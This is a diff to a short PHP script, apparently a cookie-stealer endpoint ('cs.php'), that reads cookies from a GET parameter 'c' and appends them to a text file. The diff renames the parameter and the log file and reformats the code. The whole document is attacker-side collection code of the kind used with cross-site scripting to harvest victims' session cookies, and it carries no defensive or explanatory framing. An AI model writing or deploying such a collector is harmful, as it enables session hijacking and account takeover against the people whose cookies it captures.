@@ -1,22 +1,21 @@
 <?php
 
-#If the GET variable cookiess is set run this code
-if(isset($_GET['cookies'])) {
+#cs.php?c=isset
+if (isset($_GET['c'])) {
 
-   #Seperate each cookie into an array
-   $cookies = explode(' ', $_GET['c']);
+	#Seperate each cookie into an array
+	$cookies = explode(' ', $_GET['c']);
 
-   #Open file in append mode
-   $fp = fopen('cookies.txt', 'a');
+	#Open file in append mode
+	$fp = fopen('output.txt', 'a');
 
-   #Write cookies to file
-   foreach($cookies as $cookie) {
-      fwrite($fp, $cookie . "\r\n");
-   }
+	#Write cookies to file
+	foreach($cookies as $cookie) {
+		fwrite($fp, $cookie . "\r\n");
+	}
 
-   #Close file pointer and clear variables
-   fclose($fp);
-   unset($cookies);
+	fclose($fp);
+	unset($cookies);
 }
 
 ?>
